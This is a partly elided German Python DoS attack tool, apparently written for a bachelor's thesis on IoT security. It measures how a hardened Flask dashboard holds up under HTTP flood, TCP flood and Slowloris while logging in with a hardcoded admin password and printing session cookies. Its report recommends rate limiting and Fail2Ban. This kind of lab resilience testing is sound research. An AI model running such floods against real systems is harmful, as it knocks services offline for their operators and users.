"""
DoS-Angriff gegen Flask-Dashboard (Port 5000) - MIT AUTHENTIFIZIERUNG
Angepasst für gehärtetes System (Login erforderlich für /status)

Erstellt von Claude Opus 4.6 am 22.02.2026
"""
...
CONFIG = {
    ...
    "login_password": "S3cur3!P@ssw0rd#2026",
    "login_endpoint": "",
...
@dataclass
class AttackReport:
    experiment_name: str = "DoS gegen Dashboard (Aggressive, Authenticated)"
    experiment_date: str = ""
    experiment_time: str = ""
    target: str = ""
...
class AggressiveDoSAttacker:
    ...
    def login(self) -> bool:
        """Einloggen und Session-Cookie erhalten."""
        self.log(f"Versuche Login auf {self.login_url}...", "AUTH")
        ...
        try:
            r = self.session.post(self.login_url, data=login_data, timeout=10, allow_redirects=True)
            
            if r.status_code == 200:
                test = self.session.get(self.status_url, timeout=5)
                if test.status_code == 200:
                    self.authenticated = True
                    self.log("Login erfolgreich (Form-POST)!", "SUCCESS")
                    self.log(f"  Session-Cookies: {dict(self.session.cookies)}", "AUTH")
                    return True

            self.session.cookies.clear()
            r = self.session.post(self.login_url, json=login_data, timeout=10, allow_redirects=True)
            
            if r.status_code == 200:
                test = self.session.get(self.status_url, timeout=5)
                if test.status_code == 200:
                    self.authenticated = True
                    self.log("Login erfolgreich (JSON-POST)!", "SUCCESS")
                    self.log(f"  Session-Cookies: {dict(self.session.cookies)}", "AUTH")
                    return True
            ...
            if test.status_code == 200:
                self.authenticated = True
                self.log("Login erfolgreich (Basic Auth)!", "SUCCESS")
                return True
            
            self.log(f"Login fehlgeschlagen! Status: {r.status_code}", "ERROR")
            self.log(f"  Response: {r.text[:200]}", "ERROR")
            self.authenticated = False
            return False
            
        except Exception as e:
            self.log(f"Login-Fehler: {e}", "ERROR")
            self.authenticated = False
            return False
    
    def ensure_authenticated(self):
        """Stellt sicher, dass die Session noch gültig ist. Re-Login bei Bedarf."""
        try:
            r = self.session.get(self.status_url, timeout=5)
            if r.status_code == 200:
                return True
            self.log("Session abgelaufen, versuche Re-Login...", "AUTH")
            return self.login()
        except:
            return self.login()
    ...
    def measure_once(self, phase: str) -> Measurement:
        ...
        try:
            ...
            if r.status_code in (401, 403, 302):
                self.log("Nicht autorisiert, versuche Re-Login...", "AUTH")
                if self.login():
                    start = time.time()
                    r = self.session.get(self.status_url, timeout=5)
                    response_time = (time.time() - start) * 1000
    ...
    def http_flood_worker(self):
        """HTTP Flood nutzt KEINE Authentifizierung - das ist realistischer."""
        endpoints = ["/status", "/", "/dashboard", "/login",
    ...
    def run_attack(self) -> List[Measurement]:
        ...
        self.log(f"  HTTP Flood:  {self.config['http_flood_threads']} Threads (unauthentifiziert)", "HTTP")
        ...
        self.log(f"  Messung:     via authentifizierte Session", "AUTH")
    ...
    def generate_markdown_report(self) -> str:
        ...
        return f"""# DoS-Angriff Experiment Report (Aggressive Version - Gehärtetes System)
...
Die Härtung zeigt eine gewisse Wirkung, reicht aber nicht vollständig aus.

**Empfehlung:** Zusätzlich zu Login-Schutz: Rate-Limiting und Fail2Ban."""
...
Die Härtungsmaßnahmen (Authentifizierung) in Kombination mit der Hardware-Leistung
des Raspberry Pi 5 bieten eine gute Grundresilienz.
...
└────────────────────────────────────────────────────────────────────┘
    ...
    def run_full_experiment(self):
        self.log("=" * 70)
        self.log("DoS-ANGRIFF EXPERIMENT (GEHÄRTETES SYSTEM)")
        self.log(f"Ziel: {self.target_url}")
        self.log("=" * 70)
        
        self.log("\n" + "=" * 50)
        self.log("PHASE 0: AUTHENTIFIZIERUNG")
        self.log("=" * 50)
        
        if not self.login():
            self.log("ABBRUCH: Login fehlgeschlagen!", "ERROR")
            self.log("Bitte prüfe:", "ERROR")
            self.log("  1. Ist der Server erreichbar?", "ERROR")
            self.log("  2. Stimmt der Login-Endpoint?", "ERROR")
            self.log("  3. Stimmen Username/Passwort?", "ERROR")
            self.log(f"  URL: {self.login_url}", "ERROR")
            self.log(f"  User: {self.config['login_username']}", "ERROR")
            return
...
if __name__ == "__main__":
    print("""
    ╔═══════════════════════════════════════════════════════════════════╗
    ║   DoS-ANGRIFF TOOL (GEHÄRTETES SYSTEM MIT AUTH)                  ║
    ║   Bachelorarbeit: IoT-Sicherheitsanalyse ESP32-CAM               ║
    ║                                                                   ║
    ║   Angriffsmethoden:                                              ║
    ║   • HTTP Flood (200 Threads) - unauthentifiziert                 ║
    ║   • TCP Flood gegen Port 9000 (150 Threads)                      ║
    ║   • Slowloris - Verbindungen offen halten (150 Threads)          ║
    ║                                                                   ║
    ║   Messung: via authentifizierte Session (admin-Login)             ║
    ║                                                                   ║
    ...
    print(f"  Login:             {CONFIG['login_username']} / ****")
